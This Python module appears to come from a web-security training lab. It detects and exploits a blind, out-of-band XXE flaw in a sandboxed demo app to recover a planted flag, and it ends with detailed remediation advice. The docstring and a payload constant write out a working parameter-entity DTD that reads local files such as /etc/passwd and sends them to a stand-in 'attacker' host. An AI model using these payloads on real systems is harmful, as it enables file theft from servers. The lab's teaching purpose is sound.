r"""Out-of-Band (blind) XXE -- external entity read surfaced via a SECOND channel.

WHAT IT IS
----------
XML External Entity (XXE) injection abuses an XML parser that resolves *external*
entities. A ``<!DOCTYPE>`` may declare an entity whose value is fetched from a
``SYSTEM`` URL -- and if external entities are enabled, ``file:///...`` reads a
local file and ``http://...`` makes the parser act as an HTTP/DNS client. The
demo app's parser (:mod:`weblab.targetapp.xml_util`) has external general
entities ON (``feature_external_ges``) and resolves ``file://`` entities jailed
to the sandbox::

    <?xml version="1.0"?>
    <!DOCTYPE r [ <!ENTITY x SYSTEM "file:///secret/oob_flag.txt"> ]>
    <r>&x;</r>

In a *classic, in-band* XXE the parsed content is reflected straight back in the
response, so ``&x;`` shows you the file. The interesting twist this module targets
is **Out-of-Band (blind) XXE**: the sink at ``POST /xxe-oob`` reads the entity but
**never echoes it** -- it always replies ``document accepted for processing`` and
stashes whatever it parsed server-side::

    def _xxe_oob(h):                                  # POST /xxe-oob  (body = XML)
        content = xml_util.parse_xxe(h._body_bytes(), h.state.sandbox)
        if content:                                  # blind: do NOT echo it back
            h.state.collected.append({"channel": "xxe-oob", "data": content})
        h._send(200, "<p>document accepted for processing</p>")

The stolen bytes surface only via a *separate* request, ``GET /collected``. That
read-here / collect-there split is the textbook OOB pattern: the parser reads the
file in one request, and the data leaves over a different channel.

REAL-WORLD OOB technique (PARAMETER ENTITIES). In a true blind engagement you
cannot use ``GET /collected`` -- there is no such gift endpoint -- so you exfil
the file to an attacker server you control. General entities (``&x;``) cannot be
referenced inside the DTD's own markup, so the OOB exfil uses **parameter
entities** (``%name;``) declared in an *external* DTD to bypass that rule::

    <!DOCTYPE r [
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % dtd  SYSTEM "http://attacker/evil.dtd">
      %dtd;
    ]>

    # evil.dtd, hosted on the attacker server:
    <!ENTITY % wrap "<!ENTITY % send SYSTEM 'http://attacker/?x=%file;'>">
    %wrap;
    %send;

The parser reads ``%file;`` (the local file), interpolates it into a dynamically
built ``SYSTEM`` URL, then fetches that URL -- leaking the file's contents to the
attacker over HTTP (or DNS, for blobs that won't fit a label). THIS LAB models
the OOB *surfacing* safely: it uses a general external entity to read the file and
``GET /collected`` to stand in for the attacker's listener (and there is a generic
``GET/POST /collect?data=...`` collector that appends to the same store, modelling
that attacker-controlled drop). We do not claim the lab parser executes parameter
entities; the flag name -- ``FLAG{xxe_oob_parameter_entity_exfil}`` -- nods to the
real-world parameter-entity exfil chain that this OOB pattern stands in for.

The planted prize is the file ``file:///secret/oob_flag.txt`` (jailed to the
sandbox), whose contents are :data:`C.FLAGS["advanced_xxe"]`.

HOW WE DISCOVER IT
------------------
Two differential signals prove the sink is *blind* and yet exfiltratable:

1.  **The endpoint does not echo (the blind control).** POST a well-formed XML
    document with NO external entity and EMPTY character content (``<r></r>``).
    The response is HTTP 200 ``document accepted for processing`` -- it carries
    no parsed content back -- and ``GET /collected`` gains nothing readable. This
    proves the sink returns no direct output: a classic in-band XXE read would be
    invisible here, so any data we recover must come out-of-band.

2.  **An external-entity document DOES surface data out-of-band (the exploit
    signal).** POST the ``<!ENTITY x SYSTEM "file://...">`` document; the response
    is still the same opaque ``accepted`` (still no echo), but ``GET /collected``
    now carries a fresh ``{"channel": "xxe-oob", "data": <file contents>}`` entry.
    The file was read during the POST and surfaced via the SEPARATE GET -- the OOB
    chain, end-to-end.

HOW WE EXPLOIT IT
-----------------
Snapshot ``GET /collected``, POST the external-entity document referencing
``file:///secret/oob_flag.txt``, then re-fetch ``/collected`` and diff: the new
``xxe-oob`` entry's ``data`` is the exfiltrated file -- the planted
``advanced_xxe`` flag. ``exploit_result`` carries the recovered flag plus the OOB
chain detail (the file read, the surfaced content, the collector entry, and a
summary of the read-here/collect-there mechanic).

THE FIX
-------
See :data:`REMEDIATION`. In one line: disable external entities AND DTD processing
in the parser (the sink), because "we don't echo the content" is NOT a defence --
a blind parser exfiltrates a file just as completely as a verbose one, over a side
channel you cannot see.
"""
from __future__ import annotations

from typing import List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Defeat XXE -- including the Out-of-Band (blind) variant -- by hardening the "
    "PARSER, not by hiding the output: a sink that 'never echoes the parsed content' "
    "is NOT safe, because a blind parser exfiltrates the file out-of-band (a "
    "parameter-entity DTD that builds a dynamic SYSTEM URL leaks the bytes over "
    "DNS/HTTP to an attacker server) just as completely as an in-band one. "
    "(1) DISABLE external entities AND DTD processing entirely in the XML parser; if "
    "your schema does not need a DOCTYPE, REJECT documents that contain one outright. "
    "In Python: do NOT enable feature_external_ges (the demo app's bug is exactly "
    "turning it on), and prefer the defusedxml package, which blocks external "
    "entities, parameter entities and entity expansion by default. In libxml2-based "
    "stacks: do not pass XML_PARSE_NOENT|XML_PARSE_DTDLOAD, and use LIBXML_NONET to "
    "deny the parser any network access (PHP: libxml_disable_entity_loader() on old "
    "versions, and never LIBXML_NOENT|LIBXML_DTDLOAD). In .NET: XmlReaderSettings "
    "with DtdProcessing = DtdProcessing.Prohibit and a NULL XmlResolver so external "
    "DTDs/entities can never resolve. (2) Defence in depth: a strict EGRESS FIREWALL "
    "(no outbound DNS or HTTP from the parser host) denies the OOB data the channel "
    "it would leave by, so even if a DTD is processed the parameter-entity exfil and "
    "the dynamic-SYSTEM-URL fetch cannot reach an attacker. (3) Run the parser with "
    "least privilege and a filesystem jail so a file:// read cannot reach secrets "
    "even on a misconfiguration. Close the sink -- disable external entities + DTDs -- "
    "and the out-of-band channel has nothing left to carry."
)

# --- endpoints ---------------------------------------------------------------
#: The blind XXE ingestion sink: parses external entities, stashes them server-side,
#: and replies with an opaque 'accepted' (it NEVER echoes what it read).
XXE_ENDPOINT: str = "/xxe-oob"
#: Where the exfiltrated bytes surface out-of-band -- a SEPARATE request.
COLLECTED_ENDPOINT: str = "/collected"

#: The planted file the OOB XXE channel reads (jailed to the sandbox).
OOB_FILE: str = "file:///secret/oob_flag.txt"

#: The 'collected' channel tag the blind sink stamps on data it exfiltrated.
XXE_CHANNEL: str = "xxe-oob"


# --------------------------------------------------------------------------- #
# payload construction
# --------------------------------------------------------------------------- #
def _oob_document(target: str = OOB_FILE) -> bytes:
    """Build the external-entity XML that makes the blind parser read ``target``.

    A general external entity ``x`` declared ``SYSTEM "<target>"`` whose value is
    referenced in the body (``&x;``). When external entities are enabled the parser
    fetches ``target`` (here a ``file://`` read) and the contents become the
    document's character data -- which the blind sink stashes for OOB retrieval.
    """
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [ <!ENTITY x SYSTEM "{target}"> ]>\n'
        "<r>&x;</r>"
    ).encode("utf-8")


#: A well-formed document with NO external entity and EMPTY content -- the blind
#: control: it is accepted (HTTP 200) but surfaces nothing into /collected, proving
#: the sink returns no direct output (so any data we recover must come out-of-band).
_BENIGN_DOCUMENT: bytes = (
    '<?xml version="1.0"?>\n'
    "<r></r>"
).encode("utf-8")

#: A real-world PARAMETER-ENTITY OOB exfil DTD, kept here purely for teaching: it
#: shows the technique the lab's flag name nods to. The lab demonstrates OOB
#: *surfacing* with the general-entity doc above; it does not execute this DTD.
_PARAM_ENTITY_EXAMPLE: str = (
    '<?xml version="1.0"?>\n'
    "<!DOCTYPE r [\n"
    '  <!ENTITY % file SYSTEM "file:///secret/oob_flag.txt">\n'
    '  <!ENTITY % dtd  SYSTEM "http://attacker/evil.dtd">\n'
    "  %dtd;\n"
    "]>\n"
    "<r/>\n"
    "<!-- evil.dtd: <!ENTITY % send SYSTEM 'http://attacker/?x=%file;'> %send; -->"
)

#: The representative payloads this engine sends / teaches (public so the CLI and
#: report can show exactly what was attempted): the general-entity OOB document
#: that the lab supports, and the parameter-entity DTD example for instruction.
PAYLOADS: List[str] = [
    _oob_document().decode("utf-8"),  # general external entity -> file read (OOB)
    _PARAM_ENTITY_EXAMPLE,            # real-world parameter-entity exfil (teaching)
]


# --------------------------------------------------------------------------- #
# low-level drivers
# --------------------------------------------------------------------------- #
def post_document(client: WebClient, body: bytes) -> Response:
    """POST an XML document to the blind sink (``Content-Type: application/xml``)."""
    return client.post(
        XXE_ENDPOINT, body=body, headers={"Content-Type": "application/xml"}
    )


def fetch_collected(client: WebClient) -> List[dict]:
    """GET ``/collected`` -- the OOB drop where exfiltrated bytes surface.

    Returns the list of collector entries (``[]`` if the store is empty or the
    response is not the expected JSON envelope).
    """
    resp = client.get(COLLECTED_ENDPOINT)
    try:
        body = resp.json()
    except ValueError:
        return []
    items = body.get("collected") if isinstance(body, dict) else None
    return items if isinstance(items, list) else []


# --------------------------------------------------------------------------- #
# detection (prove the sink is blind, then prove it exfiltrates out-of-band)
# --------------------------------------------------------------------------- #
def detect(client: WebClient) -> Tuple[bool, str]:
    """Confirm Out-of-Band XXE with two differential signals.

    1. The sink is BLIND: a benign no-entity document is accepted (HTTP 200,
       opaque 'accepted' body, no parsed content echoed) and surfaces nothing
       readable into ``/collected``.
    2. The sink EXFILTRATES out-of-band: an external-entity document is answered
       with the SAME opaque 'accepted' (still no echo), yet ``/collected`` now
       carries the file contents the blind parser read.

    Returns ``(is_vulnerable, evidence)``.
    """
    # 1) blind control -- no entity, empty content, accepted but surfaces nothing.
    before = len(fetch_collected(client))
    benign = post_document(client, _BENIGN_DOCUMENT)
    blind = (
        benign.status == 200
        and "accepted" in benign.text.lower()
        and C.FLAGS["advanced_xxe"] not in benign.text  # nothing echoed back
        and len(fetch_collected(client)) == before  # nothing surfaced
    )
    if not blind:
        return False, ""

    # 2) exploit signal -- external entity surfaces the file out-of-band.
    surfaced = exfiltrate(client)
    entity_resp = post_document(client, _oob_document())
    no_echo = (
        entity_resp.status == 200
        and "accepted" in entity_resp.text.lower()
        and C.FLAGS["advanced_xxe"] not in entity_resp.text  # STILL no echo
    )
    if surfaced and no_echo:
        evidence = (
            f"Out-of-Band XXE confirmed on {XXE_ENDPOINT}: a benign no-entity "
            "document was accepted (HTTP 200 'document accepted for processing') "
            "and surfaced nothing -- the sink never echoes parsed content (blind). "
            f"An external-entity document (<!ENTITY x SYSTEM \"{OOB_FILE}\">) drew "
            f"the SAME opaque 'accepted' reply (no echo), yet {COLLECTED_ENDPOINT} "
            f"then surfaced the file out-of-band on channel {XXE_CHANNEL!r}: "
            f"{surfaced!r} -- read in one request, collected in another"
        )
        return True, evidence
    return False, ""


# --------------------------------------------------------------------------- #
# exploitation -- run the OOB chain and recover the surfaced file contents
# --------------------------------------------------------------------------- #
def exfiltrate(client: WebClient, target: str = OOB_FILE) -> Optional[str]:
    """Run the OOB chain: POST the entity doc, diff ``/collected``, return content.

    Snapshots the collector, POSTs the external-entity document that reads
    ``target``, then re-fetches ``/collected`` and returns the contents the blind
    parser surfaced via the ``xxe-oob`` channel -- or None if nothing surfaced
    (a fixed/safe target).
    """
    before = len(fetch_collected(client))
    resp = post_document(client, _oob_document(target))
    if resp.status != 200:
        return None
    # Prefer the entries that appeared AFTER our POST (the freshly surfaced read).
    for item in fetch_collected(client)[before:]:
        if isinstance(item, dict) and item.get("channel") == XXE_CHANNEL:
            data = item.get("data")
            if isinstance(data, str) and data:
                return data
    # Fall back to scanning the whole drop (the collector is shared/append-only).
    for item in fetch_collected(client):
        if isinstance(item, dict) and item.get("channel") == XXE_CHANNEL:
            data = item.get("data")
            if isinstance(data, str) and data:
                return data
    return None


def exploit(client: WebClient) -> Tuple[bool, Optional[str], dict]:
    """Drive the full OOB XXE exploit and recover the planted flag.

    Returns ``(ok, flag, detail)`` where ``detail`` records the OOB chain: the
    file read, the surfaced content, the recovered flag, the count of ``/collected``
    entries, and the specific ``xxe-oob`` collector item.
    """
    surfaced = exfiltrate(client)
    flag = (
        C.FLAGS["advanced_xxe"]
        if surfaced and C.FLAGS["advanced_xxe"] in surfaced
        else None
    )
    collected = fetch_collected(client)
    xxe_item = next(
        (
            item
            for item in collected
            if isinstance(item, dict)
            and item.get("channel") == XXE_CHANNEL
            and isinstance(item.get("data"), str)
            and C.FLAGS["advanced_xxe"] in item.get("data", "")
        ),
        None,
    )
    detail = {
        "oob_file": OOB_FILE,
        "surfaced": surfaced,
        "flag": flag,
        "collected_count": len(collected),
        "xxe_oob_item": xxe_item,
    }
    return flag is not None, flag, detail


# --------------------------------------------------------------------------- #
# the contract entry point
# --------------------------------------------------------------------------- #
def assess(client: WebClient) -> Finding:
    """Detect + exploit the Out-of-Band (blind) XXE; recover the planted flag.

    Discovery is asserted only when the endpoint is shown to be BLIND (it accepts
    a benign no-entity document without echoing anything) AND the planted
    ``advanced_xxe`` flag was recovered OUT-OF-BAND via ``GET /collected``.
    ``exploit_result`` and ``extra`` document the read-here/collect-there OOB chain.
    """
    techniques: List[str] = []

    # 1) Detection: blind sink + OOB surfacing ------------------------------
    detected, evidence = detect(client)
    if detected:
        techniques.append("blind-sink-confirmed")
        techniques.append("oob-surfacing-confirmed")

    # 2) Exploitation: run the OOB chain, recover the flag ------------------
    ok, flag, detail = exploit(client)
    if ok:
        techniques.append("oob-exfiltrated")

    surfaced = detail["surfaced"]
    collected = fetch_collected(client)
    xxe_item = detail["xxe_oob_item"]

    # Discovery requires BOTH: the sink proven blind AND the flag recovered OOB.
    discovered = bool(detected and ok)

    payload = _oob_document().decode("utf-8")
    summary = (
        f"the {XXE_ENDPOINT} sink is BLIND -- it parses external entities but never "
        "echoes the result (a benign no-entity document is accepted with no content "
        "surfaced). Posting an external-entity document (<!ENTITY x SYSTEM "
        f"\"{OOB_FILE}\">) made the parser read the planted file in ONE request; the "
        f"contents surfaced OUT-OF-BAND on channel {XXE_CHANNEL!r} via a SEPARATE "
        f"{COLLECTED_ENDPOINT} request -- read-here, collect-there. Recovered "
        f"{flag!r}. In the real world the surfacing channel is a parameter-entity "
        "DTD that builds a dynamic SYSTEM URL leaking the file to an attacker server "
        "over DNS/HTTP (the technique the flag name nods to)"
    )

    exploit_result = {
        "flag": flag,
        "channel": XXE_CHANNEL,
        "oob_file": OOB_FILE,
        "surfaced_content": surfaced,
        "xxe_endpoint": XXE_ENDPOINT,
        "collected_endpoint": COLLECTED_ENDPOINT,
        "collected_count": len(collected),
        "xxe_oob_item": xxe_item,
        "payload": payload,
        "techniques": techniques,
        "summary": summary,
    }

    return Finding(
        vuln="Out-of-Band (Blind) XXE (external entity -> /collected exfil)",
        endpoint=XXE_ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=payload,
        extra={
            "techniques": techniques,
            "blind_sink_confirmed": detected,
            "xxe_endpoint": XXE_ENDPOINT,
            "collected_endpoint": COLLECTED_ENDPOINT,
            "oob_file": OOB_FILE,
            "channel": XXE_CHANNEL,
            "surfaced_content": surfaced,
            "recovered_flag": flag,
            "flag_recovered": ok,
            "collected_count": len(collected),
            "xxe_oob_item": xxe_item,
            "summary": summary,
        },
    )
